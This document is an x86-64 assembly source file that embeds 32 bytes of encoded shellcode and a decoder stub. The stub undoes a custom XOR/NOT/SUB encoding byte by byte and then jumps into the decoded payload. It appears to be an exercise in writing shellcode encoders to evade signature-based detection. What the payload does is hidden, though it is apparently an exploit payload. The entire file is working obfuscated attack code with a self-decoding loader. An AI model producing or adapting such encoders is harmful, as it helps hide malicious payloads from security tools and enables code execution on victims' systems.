; custom-decoder.nasm
; Author: Alex


global _start

section .text ; stores the main program code

_start:

    jmp decoder
    encoded_shellcode: db 0x9a,0x0d,0x12,0x62,0x9a,0x1f,0x03,0x7c,0x45,0x48,0x03,0x03,0x57,0x7a,0x77,0x9a,0xa5,0xfb,0x62,0x9a,0xa5,0xfc,0x6b,0x9a,0xa5,0xc0,0x9a,0xa7,0x12,0x9f,0x23,0x21


decoder:
    lea rsi, [rel encoded_shellcode]
    xor rcx, rcx  ; zero out RCX
    mov cl, 32    ; store the length of the shellcode in bytes in CL

decode:
    xor byte [rsi], 0xA9
    not byte [rsi]
    xor byte [rsi], 0xCC
    sub byte [rsi], 0x0A
    xor byte [rsi], 0xBB
    sub byte [rsi], 0x05

    inc rsi        ; move to the next byte that will be decoded
    loop decode    ; since RCX (CL) is now loaded with the value of 32, it will loop 32 times decreasing RCX each time until it becomes zero, and it will then perform the below short jump to the decoded shellcode

    jmp short encoded_shellcode